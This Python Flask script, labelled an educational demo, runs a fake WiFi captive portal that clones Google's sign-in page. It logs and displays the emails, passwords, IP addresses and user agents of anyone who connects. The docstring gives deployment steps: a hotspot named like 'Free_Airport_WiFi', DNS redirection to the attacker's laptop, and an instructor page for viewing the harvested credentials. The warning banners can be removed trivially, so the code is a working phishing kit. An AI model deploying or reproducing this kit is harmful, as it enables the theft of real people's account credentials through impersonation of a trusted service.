#!/usr/bin/env python3
"""
EDUCATIONAL FAKE WIFI PORTAL (GOOGLE STYLE)
-------------------------------------------
This is a demonstration tool for cybersecurity education.
It simulates a malicious WiFi captive portal that mimics Google's login page.
DO NOT USE THIS FOR ANYTHING EXCEPT EDUCATIONAL PURPOSES.

Requirements:
- Python 3
- Flask
- A device that can create a WiFi hotspot (most laptops/smartphones)

How to use:
1. Set up a WiFi hotspot on your device with an enticing name like "Free_Airport_WiFi"
2. Run this script with administrator privileges
3. Use Simple DNS Redirector to redirect all DNS queries to your laptop's IP
4. When users connect to your hotspot, they'll be redirected to this fake portal
5. Demonstrate how easily credentials can be stolen
"""

from flask import Flask, render_template, request, redirect, url_for
import logging
import os
import time

app = Flask(__name__)

# Set up logging to show captured credentials
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)

# Store captured credentials (in a real attack, these might be saved to a file or sent to the attacker)
captured_credentials = []

@app.route('/')
def index():
    """Main landing page that mimics a WiFi captive portal with Google login"""
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Process the login form submission"""
    # Extract credentials from the form
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    
    # Log the captured credentials (for demonstration purposes)
    logging.info(f"⚠️ CAPTURED CREDENTIALS ⚠️ - Email: {email}, Password: {password}")
    
    # Store the credentials
    captured_credentials.append({
        'email': email,
        'password': password,
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'ip_address': request.remote_addr,
        'user_agent': request.user_agent.string
    })
    
    # Redirect to a "success" page
    return redirect(url_for('success'))

@app.route('/success')
def success():
    """Show a success page after credentials have been captured"""
    return render_template('success.html')

@app.route('/instructor')
def instructor():
    """Secret page for the instructor to view captured credentials"""
    return render_template('instructor.html', credentials=captured_credentials)

# Create the templates directory and template files
def create_templates():
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    # Main page template - Google-style login
    with open('templates/index.html', 'w', encoding='utf-8') as f:
        f.write('''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #202124;
        }
        .login-container {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .google-logo {
            height: 24px;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-top: 16px;
            margin-bottom: 8px;
        }
        h2 {
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 32px;
            color: #202124;
        }
        .form-container {
            width: 100%;
        }
        .form-group {
            margin-bottom: 24px;
            width: 100%;
        }
        .form-input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .form-input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }
        .create-account {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        .next-button {
            background-color: #1a73e8;
            color: white;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .next-button:hover {
            background-color: #1765cc;
        }
        .footer {
            margin-top: 32px;
            display: flex;
            justify-content: space-between;
            width: 100%;
        }
        .footer a {
            color: #757575;
            font-size: 12px;
            text-decoration: none;
            margin-right: 16px;
        }
        .warning-banner {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background-color: #ff5252;
            color: white;
            text-align: center;
            padding: 10px;
            font-weight: bold;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="warning-banner">
        EDUCATIONAL DEMO: This is a simulation of a phishing attack for cybersecurity education
    </div>
    
    <div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo" style="width: 75px;">
        <h1>Sign in</h1>
        <h2>to continue to Gmail</h2>
        
        <div class="form-container">
            <form action="/login" method="post">
                <div class="form-group">
                    <input type="email" id="email" name="email" class="form-input" placeholder="Email or phone" required>
                </div>
                
                <div class="form-group">
                    <input type="password" id="password" name="password" class="form-input" placeholder="Password" required>
                </div>
                
                <div class="button-container">
                    <a href="#" class="create-account">Create account</a>
                    <button type="submit" class="next-button">Next</button>
                </div>
            </form>
        </div>
        
        <div class="footer">
            <div>
                <a href="#">English (United States)</a>
            </div>
            <div>
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
</body>
</html>''')
    
    # Success page template
    with open('templates/success.html', 'w', encoding='utf-8') as f:
        f.write('''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="5;url=https://www.google.com">
    <title>Connected Successfully</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .container {
            max-width: 500px;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .success-icon {
            font-size: 64px;
            color: #0F9D58;
            margin-bottom: 24px;
        }
        h1 {
            color: #202124;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 16px;
        }
        p {
            color: #5f6368;
            font-size: 16px;
            line-height: 1.5;
        }
        .warning {
            background-color: #ffdddd;
            border-left: 6px solid #f44336;
            padding: 16px;
            margin: 20px 0;
            text-align: left;
            font-size: 14px;
        }
        .warning-banner {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            background-color: #ff5252;
            color: white;
            text-align: center;
            padding: 10px;
            font-weight: bold;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="warning-banner">
        EDUCATIONAL DEMO: This is a simulation of a phishing attack for cybersecurity education
    </div>
    
    <div class="container">
        <div class="success-icon">✓</div>
        <h1>Connected Successfully!</h1>
        <p>You're now signed in and connected to the WiFi network.</p>
        <p>You will be redirected in a few seconds...</p>
        
        <div class="warning">
            <strong>EDUCATIONAL DEMO:</strong> In a real phishing attack, your credentials would now be 
            in the hands of an attacker. Always verify the legitimacy of WiFi networks and login pages 
            before entering your credentials.
        </div>
    </div>
</body>
</html>''')
    
    # Instructor page template
    with open('templates/instructor.html', 'w', encoding='utf-8') as f:
        f.write('''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instructor View - Captured Credentials</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f8f9fa;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #d32f2f;
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 24px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 24px;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 12px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
            font-weight: 500;
        }
        tr:nth-child(even) {
            background-color: #f9f9f9;
        }
        .warning {
            background-color: #ffdddd;
            border-left: 6px solid #f44336;
            padding: 16px;
            margin-bottom: 24px;
        }
        .timestamp {
            color: #5f6368;
            font-size: 14px;
        }
        .credentials {
            font-weight: 500;
        }
        .user-agent {
            font-size: 12px;
            max-width: 300px;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Captured Credentials</h1>
        
        <div class="warning">
            <strong>EDUCATIONAL USE ONLY:</strong> This demonstrates how easily credentials can be captured
            in a phishing attack. In a real attack, this page would only be accessible to the attacker.
            Never use this technique for malicious purposes.
        </div>
        
        {% if credentials %}
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>Email</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>User Agent</th>
                </tr>
                {% for cred in credentials %}
                <tr>
                    <td class="timestamp">{{ cred.timestamp }}</td>
                    <td class="credentials">{{ cred.email }}</td>
                    <td class="credentials">{{ cred.password }}</td>
                    <td>{{ cred.ip_address }}</td>
                    <td class="user-agent">{{ cred.user_agent }}</td>
                </tr>
                {% endfor %}
            </table>
        {% else %}
            <p>No credentials captured yet.</p>
        {% endif %}
    </div>
</body>
</html>''')

if __name__ == '__main__':
    create_templates()
    
    print("""
    ┌───────────────────────────────────────────────────┐
    │                                                   │
    │  🚨 EDUCATIONAL FAKE WIFI PORTAL RUNNING 🚨      │
    │                                                   │
    │  This tool demonstrates a common phishing attack. │
    │  Use ONLY for educational purposes.               │
    │                                                   │
    │  1. Make sure your WiFi hotspot is active         │
    │  2. DNS redirector is forwarding to this server   │
    │  3. Access http://YOUR-IP/instructor              │
    │     to view captured credentials                  │
    │                                                   │
    └───────────────────────────────────────────────────┘
    """)
    
    # Run the Flask app on port 80 (requires admin/root)
    app.run(host='0.0.0.0', port=80, debug=True)